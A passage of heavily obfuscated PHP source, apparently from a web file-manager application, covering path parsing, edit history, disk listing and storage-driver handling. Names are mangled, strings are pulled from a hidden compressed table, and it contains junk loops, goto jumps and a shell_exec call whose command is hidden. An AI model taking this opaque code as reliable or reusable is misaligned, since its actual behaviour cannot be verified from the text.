get_path_this($ÍŸ‘é¿š)); } public static function listData($ôşêÃóÑ, $±«§Œ÷ß = true) { $øûÃæåê =& $_SERVER[Õò”†—·]; if ($±«§Œ÷ß && !IO::exist($ôşêÃóÑ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ôşêÃóÑ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $úŒ÷ÓÔ¡ = self::pathHistory($ôşêÃóÑ); $ÔµÚö°à = array($øûÃæåê[1298] => $úŒ÷ÓÔ¡ . $øûÃæåê[1285], $øûÃæåê[1297] => rtrim(get_path_father($úŒ÷ÓÔ¡), $øûÃæåê[18]) . $øûÃæåê[18], $øûÃæåê[429] => array()); $£‚ìÚ = IO::getContent($ÔµÚö°à[$øûÃæåê[1298]]); if ($£‚ìÚ) { $íÒÎ½Õ° = json_decode($£‚ìÚ, !0); if (is_array($íÒÎ½Õ°)) { $ÔµÚö°à[$øûÃæåê[429]] = $íÒÎ½Õ°; } } return $ÔµÚö°à; } private static function saveData($µ‹ˆãÆ, $Ïî´ü¦º) { $ªıÌñå =& $_SERVER[Õò”†—·]; self::log($ªıÌñå[1301] . $µ‹ˆãÆ . $ªıÌñå[84] . count($Ïî´ü¦º), $ªıÌñå[802]); if ($Ïî´ü¦º) { return IO::setContent($µ‹ˆãÆ, json_encode($Ïî´ü¦º)); } $ôµÆ‚³ô = IO::pathFather($µ‹ˆãÆ); IO::remove($µ‹ˆãÆ); self::clearEmptyFolder($ôµÆ‚³ô); return !0; } public static function clearEmptyFolder($ú åş´Ò) { $ÌÛÁû¾ =& $_SERVER[Õò”†—·]; if (trim($ú åş´Ò, $ÌÛÁû¾[18]) == trim(self::$_historyBase, $ÌÛÁû¾[18])) { return; } $óşâ¹Óå = IO::pathFather($ú åş´Ò); $‘ÉÁ€û¢ = IO::has($ú åş´Ò, !0); if ($‘ÉÁ€û¢[$ÌÛÁû¾[240]] > 0 || $‘ÉÁ€û¢[$ÌÛÁû¾[241]] > 0) { return; } IO::remove($ú åş´Ò); self::clearEmptyFolder($óşâ¹Óå); } private static function getBasePath() { $´Ì…¾µ =& $_SERVER[Õò”†—·]; $ªöù ø = Model($´Ì…¾µ[1302])->get($´Ì…¾µ[1303]); if ($ªöù ø) { if (!IO::exist($ªöù ø)) { IO::mkdir($ªöù ø); } if (get_path_this($ªöù ø) == $´Ì…¾µ[1288]) { $ÛÌú¦ŒÛ = $´Ì…¾µ[1304] . rand_string(8); @rename($ªöù ø, get_path_father($ªöù ø) . $´Ì…¾µ[18] . $ÛÌú¦ŒÛ); $ªöù ø = DATA_PATH . $ÛÌú¦ŒÛ . $´Ì…¾µ[18]; file_put_contents(DATA_PATH . $´Ì…¾µ[1238], $´Ì…¾µ[22]); Model($´Ì…¾µ[1302])->set($´Ì…¾µ[1303], $ªöù ø); } return $ªöù ø; } $ªöù ø = DATA_PATH . $´Ì…¾µ[1304] . rand_string(8) . $´Ì…¾µ[18]; $ªöù ø = IO::mkdir($ªöù ø); $ªöù ø = rtrim($ªöù ø, $´Ì…¾µ[18]) . $´Ì…¾µ[18]; file_put_contents($ªöù ø . $´Ì…¾µ[1238], $´Ì…¾µ[22]); file_put_contents(DATA_PATH . $´Ì…¾µ[1238], $´Ì…¾µ[22]); Model($´Ì…¾µ[1302])->set($´Ì…¾µ[1303], $ªöù ø); return $ªöù ø; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\x52\x65\x63\171\143\154\145\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\x72\x46\151\x6c\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\106\x69\x6c\x65\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\122\x6f\x6f\164\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\165\163\x65\162\x53\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\123\150\x61\x72\145\x4c\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\x72\x65\x54\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\145\111\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\x65\x49\164\x65\155\114\x69\156\153\175"; const KOD_SEARCH = "\173\163\x65\141\162\x63\x68\x7d"; const KOD_BLOCK = "\173\142\154\157\x63\x6b\175"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\122\145\156\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x64\162\151\x76\x65\x72\x7d"; public static function typeList() { $‚ğò ©‰ =& $_SERVER[Õò”†—·]; return array($‚ğò ©‰[1305] => self::KOD_SOURCE, $‚ğò ©‰[1306] => self::KOD_USER_RECYCLE, $‚ğò ©‰[1307] => self::KOD_USER_FAV, $‚ğò ©‰[1308] => self::KOD_USER_FILE_TAG, $‚ğò ©‰[1309] => self::KOD_USER_FILE_TYPE, $‚ğò ©‰[1310] => self::KOD_GROUP_ROOT_SELF, $‚ğò ©‰[1311] => self::KOD_USER_SHARE, $‚ğò ©‰[1312] => self::KOD_USER_SHARE_LINK, $‚ğò ©‰[1313] => self::KOD_USER_SHARE_TO_ME, $‚ğò ©‰[1314] => self::KOD_SHARE_ITEM, $‚ğò ©‰[1315] => self::KOD_SHARE_LINK, $‚ğò ©‰[1316] => self::KOD_SEARCH, $‚ğò ©‰[1317] => self::KOD_BLOCK, $‚ğò ©‰[1318] => self::KOD_IO, $‚ğò ©‰[1319] => self::KOD_USER_RECENT, $‚ğò ©‰[1320] => self::KOD_USER_DRIVER); } public static function parse($¹ÂŒ¢¸ä) { $¡ÇÃŒşÔ =& $_SERVER[Õò”†—·]; $¹ÂŒ¢¸ä = self::clear($¹ÂŒ¢¸ä); $·ıƒŒƒÄ = array_values(self::typeList()); preg_match($¡ÇÃŒşÔ[1321], $¹ÂŒ¢¸ä, $Œü½‡); $Û‘¼•æ = array($¡ÇÃŒşÔ[480] => !1, $¡ÇÃŒşÔ[1322] => !1, $¡ÇÃŒşÔ[477] => !1, $¡ÇÃŒşÔ[97] => $¹ÂŒ¢¸ä, $¡ÇÃŒşÔ[1223] => !1, $¡ÇÃŒşÔ[1222] => $¡ÇÃŒşÔ[22]); if (is_array($Œü½‡) && count($Œü½‡) == 5) { $ó„ƒÅáÏ = $¡ÇÃŒşÔ[1323] . $Œü½‡[2] . $¡ÇÃŒşÔ[387]; if (in_array($ó„ƒÅáÏ, $·ıƒŒƒÄ)) { $Û‘¼•æ[$¡ÇÃŒşÔ[1223]] = $Œü½‡[1]; $Û‘¼•æ[$¡ÇÃŒşÔ[43]] = $ó„ƒÅáÏ; $Û‘¼•æ[$¡ÇÃŒşÔ[1324]] = substr($ó„ƒÅáÏ, 1, -1); $Û‘¼•æ[$¡ÇÃŒşÔ[459]] = $Œü½‡[3]; } $Û‘¼•æ[$¡ÇÃŒşÔ[1222]] = $Œü½‡[4]; } $¤™‹¡Á = array($¡ÇÃŒşÔ[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Û‘¼•æ[$¡ÇÃŒşÔ[1287]] = in_array($Û‘¼•æ[$¡ÇÃŒşÔ[43]], $¤™‹¡Á); return $Û‘¼•æ; } public static function isTruePath($®Ãçí¨ş) { $úÔ«‰Ô =& $_SERVER[Õò”†—·]; if (substr($®Ãçí¨ş, 0, 1) != $úÔ«‰Ô[1323]) { return !0; } if (strpos($®Ãçí¨ş, $úÔ«‰Ô[467]) === 0) { return !0; } if (strpos($®Ãçí¨ş, $úÔ«‰Ô[1291]) === 0) { return !0; } if (strpos($®Ãçí¨ş, $úÔ«‰Ô[1325]) === 0) { return !0; } if (strpos($®Ãçí¨ş, $úÔ«‰Ô[1326]) === 0) { return !0; } if (strpos($®Ãçí¨ş, $úÔ«‰Ô[1327]) === 0) { return !0; } return !1; } public static function clear($‡¸Û¥í‡) { $óˆÚÃñŠ =& $_SERVER[Õò”†—·]; $‡¸Û¥í‡ = str_replace(array($óˆÚÃñŠ[1129], $óˆÚÃñŠ[12]), $óˆÚÃñŠ[63], $‡¸Û¥í‡); $‡¸Û¥í‡ = str_replace($óˆÚÃñŠ[110], $óˆÚÃñŠ[18], $‡¸Û¥í‡); $çİÇ„¤ = $óˆÚÃñŠ[1328]; if (substr($‡¸Û¥í‡, 0, 3) == $óˆÚÃñŠ[1329]) { $‡¸Û¥í‡ = substr($‡¸Û¥í‡, 3); } while (strstr($‡¸Û¥í‡, $çİÇ„¤)) { $‡¸Û¥í‡ = str_replace($çİÇ„¤, $óˆÚÃñŠ[18], $‡¸Û¥í‡); } $‡¸Û¥í‡ = preg_replace($óˆÚÃñŠ[1330], $óˆÚÃñŠ[18], $‡¸Û¥í‡); if ($‡¸Û¥í‡ == $óˆÚÃñŠ[18]) { return $óˆÚÃñŠ[18]; } $‡¸Û¥í‡ = rtrim($‡¸Û¥í‡, $óˆÚÃñŠ[18]); return $‡¸Û¥í‡; } public static function pathTrue($ë½Ù¡öÇ) { $ì™Ä»§± =& $_SERVER[Õò”†—·]; if (!$ë½Ù¡öÇ) { return $ì™Ä»§±[22]; } $ë½Ù¡öÇ = str_replace($ì™Ä»§±[577], $ì™Ä»§±[18], str_replace($ì™Ä»§±[1331], $ì™Ä»§±[18], $ë½Ù¡öÇ)); $ë½Ù¡öÇ = str_replace($ì™Ä»§±[577], $ì™Ä»§±[18], str_replace($ì™Ä»§±[1331], $ì™Ä»§±[18], $ë½Ù¡öÇ)); if (!strstr($ë½Ù¡öÇ, $ì™Ä»§±[1329])) { return $ë½Ù¡öÇ; } $••™×øô = explode($ì™Ä»§±[18], $ë½Ù¡öÇ); foreach ($••™×øô as $ÇÏÑ£ğ => $Ö€±üçÌ) { if ($Ö€±üçÌ !== $ì™Ä»§±[1332]) { continue; } for ($®˜¥ãí = $ÇÏÑ£ğ; $®˜¥ãí >= 0; $®˜¥ãí--) { if ($••™×øô[$®˜¥ãí] === $ì™Ä»§±[20] || $••™×øô[$®˜¥ãí] === $ì™Ä»§±[1332] || $••™×øô[$®˜¥ãí] === -1) { continue; } if ($••™×øô[$®˜¥ãí] === $ì™Ä»§±[22]) { $••™×øô[$ÇÏÑ£ğ] = -1; break; } $••™×øô[$ÇÏÑ£ğ] = -1; $••™×øô[$®˜¥ãí] = -1; break; } } $øœÓÔĞ = array(); foreach ($••™×øô as $Ö€±üçÌ) { if ($Ö€±üçÌ !== -1) { $øœÓÔĞ[] = $Ö€±üçÌ; } } $Û¶î›Ÿë = implode($ì™Ä»§±[18], $øœÓÔĞ); if (strpos($Û¶î›Ÿë, $ì™Ä»§±[1333]) === 0) { $Û¶î›Ÿë = $ì™Ä»§±[1329] . substr($Û¶î›Ÿë, strlen($ì™Ä»§±[1333])); } return $Û¶î›Ÿë; } public static function sourceID($·ÔÖÖøÁ) { $¨Ş¶Ñ¾› =& $_SERVER[Õò”†—·]; $Ãªá±‡Ê = self::parse($·ÔÖÖøÁ); if ($Ãªá±‡Ê[$¨Ş¶Ñ¾›[43]] !== self::KOD_SOURCE) { show_json(LNG($¨Ş¶Ñ¾›[1334]), !1); } return $Ãªá±‡Ê[$¨Ş¶Ñ¾›[459]]; } public static function make($Ù”ğ¬‚) { if (!$Ù”ğ¬‚) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ù”ğ¬‚)); } public static function makeShare($”úœæ›ô, $”îêóÁø) { return self::makePath(self::KOD_SHARE_ITEM, $”úœæ›ô, $”îêóÁø); } public static function makeFileTypePath($ª€à·‹Ñ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ª€à·‹Ñ); } public static function makeFileTagPath($Éø‡—ÌÉ) { return self::makePath(self::KOD_USER_FILE_TAG, $Éø‡—ÌÉ); } public static function makePath($®µºò“, $Ò¶ˆñ = '', $«ì±øñµ = '') { $Ö®¨âŒ =& $_SERVER[Õò”†—·]; $–ƒÓğ¢ = substr($®µºò“, 1, -1); $—Úæ¹ôÉ = $Ö®¨âŒ[1335] . $–ƒÓğ¢ . $Ö®¨âŒ[1336] . $Ò¶ˆñ . $Ö®¨âŒ[1337]; $—Úæ¹ôÉ = $«ì±øñµ ? $—Úæ¹ôÉ . $«ì±øñµ . $Ö®¨âŒ[18] : $—Úæ¹ôÉ; return $—Úæ¹ôÉ; } public static function hashPath($õöéÊå€, $Âã£¶ºÊ = true) { $Ùğ¢×ßÀ =& $_SERVER[Õò”†—·]; $˜…¼—Ÿ = is_array($õöéÊå€) ? $õöéÊå€ : IO::info($õöéÊå€); $…£Ì¿‡ = _get($˜…¼—Ÿ, $Ùğ¢×ßÀ[1338], $Ùğ¢×ßÀ[22]); if (!$…£Ì¿‡ && isset($˜…¼—Ÿ[$Ùğ¢×ßÀ[236]])) { $…£Ì¿‡ = trim($˜…¼—Ÿ[$Ùğ¢×ßÀ[236]], $Ùğ¢×ßÀ[131]); } if (!$…£Ì¿‡ && isset($˜…¼—Ÿ[$Ùğ¢×ßÀ[194]]) && $˜…¼—Ÿ[$Ùğ¢×ßÀ[194]]) { $˜…¼—Ÿ = IO::info(KodIO::make($˜…¼—Ÿ[$Ùğ¢×ßÀ[194]])); $…£Ì¿‡ = _get($˜…¼—Ÿ, $Ùğ¢×ßÀ[1338], $Ùğ¢×ßÀ[22]); } $Ğ¹˜„±û = md5($˜…¼—Ÿ[$Ùğ¢×ßÀ[97]] . $˜…¼—Ÿ[$Ùğ¢×ßÀ[89]] . $˜…¼—Ÿ[$Ùğ¢×ßÀ[98]]); if (!$…£Ì¿‡ && file_exists($˜…¼—Ÿ[$Ùğ¢×ßÀ[97]])) { $…£Ì¿‡ = Cache::get($Ğ¹˜„±û . $Ùğ¢×ßÀ[1339]); $…£Ì¿‡ = !1; if (!$…£Ì¿‡) { $…£Ì¿‡ = IO::hashSimple($˜…¼—Ÿ[$Ùğ¢×ßÀ[97]]); Cache::set($Ğ¹˜„±û . $Ùğ¢×ßÀ[1339], $…£Ì¿‡, 3600 * 24 * 30); } } if ($Âã£¶ºÊ && !$…£Ì¿‡) { } return $…£Ì¿‡ ? $…£Ì¿‡ : $Ğ¹˜„±û; } public static function hashPathSafe($Ï—£»Û¶, $Áá¾ÀÂÔ = true) { $’ß…äÌê =& $_SERVER[Õò”†—·]; $œ’»¯ª± = self::hashPath($Ï—£»Û¶, $Áá¾ÀÂÔ); return md5($œ’»¯ª± . $’ß…äÌê[1340] . Model($’ß…äÌê[821])->get($’ß…äÌê[822])); } public static function initSystemPath() { $»Â¸ª¾ =& $_SERVER[Õò”†—·]; if (defined($»Â¸ª¾[1341])) { return; } define($»Â¸ª¾[1341], self::systemPath($»Â¸ª¾[192])); define($»Â¸ª¾[1342], self::systemPath($»Â¸ª¾[1343])); define($»Â¸ª¾[1344], self::systemPath($»Â¸ª¾[1345])); define($»Â¸ª¾[1346], self::systemPath($»Â¸ª¾[1347])); IOHistory::bindEvent(); } public static function systemPath($åúïŞº¯) { $ˆóøšÛ =& $_SERVER[Õò”†—·]; $µ€‚çÏÅ = $ˆóøšÛ[1348] . ucfirst($åúïŞº¯); $€â °ø• = Model($ˆóøšÛ[821])->get($µ€‚çÏÅ); if ($€â °ø•) { return $€â °ø•; } if ($åúïŞº¯ == $ˆóøšÛ[192]) { $€â °ø• = self::make(Model($ˆóøšÛ[875])->systemRootPathAdd($ˆóøšÛ[590])); } else { $€â °ø• = self::systemPath($ˆóøšÛ[192]); $¥¢šè = self::sourceID($€â °ø•); $€â °ø• = self::make(Model($ˆóøšÛ[875])->mkdir($¥¢šè, $åúïŞº¯)); } Model($ˆóøšÛ[821])->set($µ€‚çÏÅ, $€â °ø•); return $€â °ø•; } public static function systemFolder($›ô®Ö“˜) { $ª»€µı‡ = IO_PATH_SYSTEM_SOURCE . $›ô®Ö“˜; $Ÿ§¿ûÎÑ = Cache::get($ª»€µı‡); if (!$Ÿ§¿ûÎÑ) { $ÓÃÎ´ß = IO::infoFullSimple($ª»€µı‡); if (!$ÓÃÎ´ß) { $Ÿ§¿ûÎÑ = IO::mkdir($ª»€µı‡, REPEAT_SKIP); } else { $Ÿ§¿ûÎÑ = $ÓÃÎ´ß[$_SERVER[Õò”†—·][97]]; } Cache::set($ª»€µı‡, $Ÿ§¿ûÎÑ, 3600 * 10); } return $Ÿ§¿ûÎÑ; } public static function defaultDriver() { return Model($_SERVER[Õò”†—·][818])->defaultDriver(); } public static function defaultIO() { $×ğ·æ·å =& $_SERVER[Õò”†—·]; $İ€ŒƒÇ¥ = self::defaultDriver(); return $×ğ·æ·å[1349] . $İ€ŒƒÇ¥[$×ğ·æ·å[459]] . $×ğ·æ·å[1337]; } public static function defaultDriverInit() { static $¬Å‹Ğô… = false; if ($¬Å‹Ğô…) { return $¬Å‹Ğô…; } $¬Å‹Ğô… = IO::init(self::defaultIO()); return $¬Å‹Ğô…; } public static function fileTypeList() { $¤Û€î™İ =& $_SERVER[Õò”†—·]; $ñ´¸‹†è = $GLOBALS[$¤Û€î™İ[16]][$¤Û€î™İ[1350]]; foreach ($ñ´¸‹†è as $·ğº•Ã¸ => $¡ÍƒŒÔÀ) { $Íáí ¸ = $¤Û€î™İ[1351] . $·ğº•Ã¸; $îëê²¯ş = LNG($Íáí ¸); if ($Íáí ¸ != $îëê²¯ş) { $ñ´¸‹†è[$·ğº•Ã¸][$¤Û€î™İ[42]] = $îëê²¯ş; } } return $ñ´¸‹†è; } public static function diskList($‰Ïù¢Æ = true) { $øô²¥’– = $_SERVER[Õò”†—·][1352]; if ($‰Ïù¢Æ) { $œŞïı— = Cache::get($øô²¥’–); if (is_array($œŞïı—)) { return $œŞïı—; } } $œŞïı— = self::diskListGet(); Cache::set($øô²¥’–, $œŞïı—, 60); return $œŞïı—; } public static function diskListGet() { $öü³úÑ =& $_SERVER[Õò”†—·]; $Æ£ˆ‘Û = array(); if ($GLOBALS[$öü³úÑ[16]][$öü³úÑ[1353]] == $öü³úÑ[1354]) { $÷†³¸ïÎ = $öü³úÑ[1355]; for ($œÂ…ñäË = 0; $œÂ…ñäË < strlen($÷†³¸ïÎ); $œÂ…ñäË++) { $ãÆÖ ÷¶ = $÷†³¸ïÎ[$œÂ…ñäË] . $öü³úÑ[1356]; if (file_exists($ãÆÖ ÷¶)) { $Æ£ˆ‘Û[] = $ãÆÖ ÷¶; } } return $Æ£ˆ‘Û; } if (!function_exists($öü³úÑ[111])) { $Æ£ˆ‘Û[] = $öü³úÑ[886]; return $Æ£ˆ‘Û; } $µï´¹òˆ = explode($öü³úÑ[12], shell_exec($öü³úÑ[1357])); array_shift($µï´¹òˆ); array_pop($µï´¹òˆ); $³¡ÒÅüÆ = array($öü³úÑ[1358], $öü³úÑ[1359], $öü³úÑ[1360], $öü³úÑ[1361], $öü³úÑ[1362], $öü³úÑ[1363], $öü³úÑ[1364], $öü³úÑ[1365]); foreach ($µï´¹òˆ as $Æ”ƒó”) { $Â¶¯±¯Õ = preg_split($öü³úÑ[1366], $Æ”ƒó”); $ãÆÖ ÷¶ = $Â¶¯±¯Õ[count($Â¶¯±¯Õ) - 1]; if (!strstr($Â¶¯±¯Õ[0], $öü³úÑ[1367]) || !$ãÆÖ ÷¶) { continue; } $ìàŸØÀ¾ = rtrim($ãÆÖ ÷¶, $öü³úÑ[18]) . $öü³úÑ[18]; if (in_array($ìàŸØÀ¾, $³¡ÒÅüÆ)) { continue; } $Æ£ˆ‘Û[] = $ìàŸØÀ¾; } return $Æ£ˆ‘Û; } public static function isSameDisk($Å”íŞáê, $Œ•ä·Û¿) { $º›İè¶ =& $_SERVER[Õò”†—·]; if ($GLOBALS[$º›İè¶[16]][$º›İè¶[1353]] == $º›İè¶[1354]) { return strtolower(substr($Å”íŞáê, 0, 1)) == strtolower(substr($Œ•ä·Û¿, 0, 1)); } $ÆâÑ¡Òˆ = self::diskList(); $¿Õ•Ú©ª = !1; $¶îöæ—õ = !1; sort($ÆâÑ¡Òˆ); $ÆâÑ¡Òˆ = array_reverse($ÆâÑ¡Òˆ); $Å”íŞáê = rtrim($Å”íŞáê, $º›İè¶[18]) . $º›İè¶[18]; $Œ•ä·Û¿ = rtrim($Œ•ä·Û¿, $º›İè¶[18]) . $º›İè¶[18]; foreach ($ÆâÑ¡Òˆ as $ãÖÎÉ•¹) { $ü©¸è§… = strlen($ãÖÎÉ•¹); if (!$¿Õ•Ú©ª && substr($Å”íŞáê, 0, $ü©¸è§…) == $ãÖÎÉ•¹) { $¿Õ•Ú©ª = $ãÖÎÉ•¹; } if (!$¶îöæ—õ && substr($Œ•ä·Û¿, 0, $ü©¸è§…) == $ãÖÎÉ•¹) { $¶îöæ—õ = $ãÖÎÉ•¹; } if ($¿Õ•Ú©ª && $¶îöæ—õ) { break; } } return $¿Õ•Ú©ª === $¶îöæ—õ; } public static function transferType($¯ÇÄ˜ªš, $Şï»¶«æ) { $ß­ÃçŸÔ =& $_SERVER[Õò”†—·]; $–å ´Ğ = self::driverType($¯ÇÄ˜ªš); $ÄÃÃ” = self::driverType($Şï»¶«æ); if ($–å ´Ğ[$ß­ÃçŸÔ[43]] == $ÄÃÃ”[$ß­ÃçŸÔ[43]] && $–å ´Ğ[$ß­ÃçŸÔ[1368]] == $ÄÃÃ”[$ß­ÃçŸÔ[1368]]) { return $ß­ÃçŸÔ[1369]; } if ($–å ´Ğ[$ß­ÃçŸÔ[43]] == $ß­ÃçŸÔ[919] && $ÄÃÃ”[$ß­ÃçŸÔ[43]] == $ß­ÃçŸÔ[119]) { return $ß­ÃçŸÔ[1248]; } if ($–å ´Ğ[$ß­ÃçŸÔ[43]] == $ß­ÃçŸÔ[119] && $ÄÃÃ”[$ß­ÃçŸÔ[43]] == $ß­ÃçŸÔ[919]) { return $ß­ÃçŸÔ[120]; } return $ß­ÃçŸÔ[1370]; } public static function driverType($èí¯™°) { $×Éç´¯ =& $_SERVER[Õò”†—·]; $àöú²· = str_replace($×Éç´¯[1371], $×Éç´¯[22], strtolower($èí¯™°->getType())); if ($àöú²· == $×Éç´¯[808] || $àöú²· == $×Éç´¯[1372] || $àöú²· == $×Éç´¯[1373]) { $èí¯™° = self::defaultDriverInit(); } else { if ($àöú²· == $×Éç´¯[1258] || $àöú²· == $×Éç´¯[1374]) { $èí¯™° = IO::init($èí¯™°->pathParse[$×Éç´¯[1204]]); } } $¶ÙÅ’ÚÃ = $èí¯™°->path; $àöú²· = str_replace($×Éç´¯[1371], $×Éç´¯[22], strtolower($èí¯™°->getType())); if ($àöú²· == $×Éç´¯[119]) { return array($×Éç´¯[43] => $×Éç´¯[119], $×Éç´¯[1368] => $×Éç´¯[22], $×Éç´¯[97] => $¶ÙÅ’ÚÃ, $×Éç´¯[108] => $èí¯™°); } return array($×Éç´¯[43] => $×Éç´¯[919], $×Éç´¯[1368] => $èí¯™°->pathDriver, $×Éç´¯[97] => $¶ÙÅ’ÚÃ, $×Éç´¯[108] => $èí¯™°); } public static function pathDriverType($Áë·À¶´) { return $Áë·À¶´ ? self::driverType(IO::init($Áë·À¶´)) : !1; } public static function pathDriverLocal($‹·¿õ™Ù) { $ç¼Á³çÅ =& $_SERVER[Õò”†—·]; $†ÎÈğ° = $‹·¿õ™Ù ? self::driverType(IO::init($‹·¿õ™Ù)) : !1; return $†ÎÈğ°[$ç¼Á³çÅ[43]] == $ç¼Á³çÅ[119] ? !0 : !1; } public static function allowCover($¨¢‘©Æ¾, $Ü¶„²‡¡ = true) { $ö¨é¹æ¡ =& $_SERVER[Õò”†—·]; if (is_string($¨¢‘©Æ¾)) { $¨¢‘©Æ¾ = IO::info($¨¢‘©Æ¾); } if (!$¨¢‘©Æ¾ || $¨¢‘©Æ¾[$ö¨é¹æ¡[43]] == $ö¨é¹æ¡[88] || $¨¢‘©Æ¾[$ö¨é¹æ¡[89]] <= 100) { return !1; } if (isset($¨¢‘©Æ¾[$ö¨é¹æ¡[1375]]) || !$¨¢‘©Æ¾[$ö¨é¹æ¡[97]]) { return !1; } if (isset($¨¢‘©Æ¾[$ö¨é¹æ¡[233]]) && !$¨¢‘©Æ¾[$ö¨é¹æ¡[233]]) { return !1; } static $ÌØÁÒÕĞ = false; if (!$ÌØÁÒÕĞ || !$Ü¶„²‡¡) { $ûš»éçı = self::driverType(IO::init($¨¢‘©Æ¾[$ö¨é¹æ¡[97]])); $€èªë£ = $ûš»éçı[$ö¨é¹æ¡[108]]; $ÌØÁÒÕĞ = $ö¨é¹æ¡[197]; if ($ûš»éçı[$ö¨é¹æ¡[43]] == $ö¨é¹æ¡[119]) { $ÌØÁÒÕĞ = $ö¨é¹æ¡[1376]; } if ($ûš»éçı[$ö¨é¹æ¡[108]] && is_array($ûš»éçı[$ö¨é¹æ¡[108]]->config)) { $îÍ«ÇµÜ = $ûš»éçı[$ö¨é¹æ¡[108]]->config; if (isset($îÍ«ÇµÜ[$ö¨é¹æ¡[1377]]) && $îÍ«ÇµÜ[$ö¨é¹æ¡[1377]]) { $ÌØÁÒÕĞ = $ö¨é¹æ¡[1376]; } } } return $ÌØÁÒÕĞ == $ö¨é¹æ¡[1376] ? !0 : !1; } } goto Fï–ğèğ±…; Båï‚§¨Œ: $_SERVER[„½Ù‘ß¨] = explode($_SERVER[Õò”†—·][664], gzinflate(substr($_SERVER[Õò”†—·][665], 10, -8))); $fglqmchkru = $_SERVER[Õò”†—·][666]; class Application { private $defaultModule = "\x69\156\144\x65\170"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($º¦Üô†…) { $ÃØ‰Ó„ =& $_SERVER[Õò”†—·]; $ó–¼Ô¤ =& $_SERVER[„½Ù‘ß¨]; $ÂÇ³öÍ± = explode($ó–¼Ô¤[0], trim($º¦Üô†…, $ó–¼Ô¤[0])); $¹ÕÑ†ÙÈ = $ÃØ‰Ó„[667]; if (strlen($¹ÕÑ†ÙÈ) < $ÃØ‰Ó„[668]) { return; } $this->defaultModule = $ÂÇ³öÍ±[0] ? $ÂÇ³öÍ±[0] : $this->defaultModule; $this->defaultController = $ÂÇ³öÍ±[1] ? $ÂÇ³öÍ±[1] : $this->defaultController; $•¨ê­Ğ£ = $ÃØ‰Ó„[669]; $this->defaultAction = $ÂÇ³öÍ±[2] ? $ÂÇ³öÍ±[2] : $this->defaultAction; $öˆ©‹Èº = $ÃØ‰Ó„[670]; while ($öˆ©‹Èº < $ÃØ‰Ó„[671]) { if ($öˆ©‹Èº >= 0) { break; } $öˆ©‹Èº++; } $this->xetca1c04475($ó–¼Ô¤[1], array($this, $ó–¼Ô¤[2])); $è ³ñÖº = $ÃØ‰Ó„[672]; if (strlen($è ³ñÖº) < $ÃØ‰Ó„[668]) { die; } } public function appRun($ÍûÔ‰¡ã) { $²‰³Ìşã =& $_SERVER[Õò”†—·]; $£áßûáì =& $_SERVER[„½Ù‘ß¨]; $İšÚÁ¯Á = explode($£áßûáì[0], $ÍûÔ‰¡ã); $áÎ”üÌ» = strtolower($İšÚÁ¯Á[0]); $Û‹ñ†èÍ = $²‰³Ìşã[673]; if (strlen($Û‹ñ†èÍ) < $²‰³Ìşã[674]) { die; } $°¤É‚Åğ = $£áßûáì[3]; $¹¬°£­É = $²‰³Ìşã[675]; if (strlen($¹¬°£­É) < $²‰³Ìşã[674]) { return; } if ($áÎ”üÌ» == $£áßûáì[4]) { $°¤É‚Åğ = $£áßûáì[5]; $İšÚÁ¯Á[0] = $£áßûáì[6]; $İšÚÁ¯Á[1] = $İšÚÁ¯Á[1] . $£áßûáì[7]; $ÍûÔ‰¡ã = join($£áßûáì[0], $İšÚÁ¯Á); $ÍûÔ‰¡ã = trim($ÍûÔ‰¡ã, $£áßûáì[0]); } call_user_func(array($£áßûáì[8], $£áßûáì[9]), $°¤É‚Åğ . $£áßûáì[10], $ÍûÔ‰¡ã); ActionCall($ÍûÔ‰¡ã); $«¸üÓ‘¥ = $²‰³Ìşã[676]; call_user_func(array($£áßûáì[8], $£áßûáì[9]), $°¤É‚Åğ . $£áßûáì[11], $ÍûÔ‰¡ã); } private function autorun() { $×Õ¾ƒí¼ =& $_SERVER[„½Ù‘ß¨]; global $config; if (count($config[$×Õ¾ƒí¼[12]]) == 0) { return; } foreach ($config[$×Õ¾ƒí¼[12]] as $öÓ½À° => $ŒØÑøª’) { $this->appRun($ŒØÑøª’); $ÃçÒµ¶ = $_SERVER[Õò”†—·][677]; if (!$ÃçÒµ¶) { return; } } } private function iljh659d3f80() { $óÕÃ¾ı =& $_SERVER[Õò”†—·]; $¾Óœ±“ =& $_SERVER[„½Ù‘ß¨]; $ùã‡´¤ı = $¾Óœ±“[4]; $İ—äó¶Õ = $GLOBALS[$¾Óœ±“[13]][$¾Óœ±“[14]][0]; $ÀÉÎä× = $óÕÃ¾ı[678]; if (!$ÀÉÎä×) { die; } if (!$İ—äó¶Õ || strlen($İ—äó¶Õ) <= strlen($ùã‡´¤ı)) { return; } if (strtolower(substr($İ—äó¶Õ, -strlen($ùã‡´¤ı))) != $ùã‡´¤ı) { return; } $Ğú‚ç„ = substr($İ—äó¶Õ, 0, -strlen($ùã‡´¤ı)); $àº„£§ = array($¾Óœ±“[4], $Ğú‚ç„); $†´ú¥åâ = $óÕÃ¾ı[679]; while ($†´ú¥åâ < $óÕÃ¾ı[671]) { if ($†´ú¥åâ >= 0) { break; } $†´ú¥åâ++; } $ïû’›ğµ = 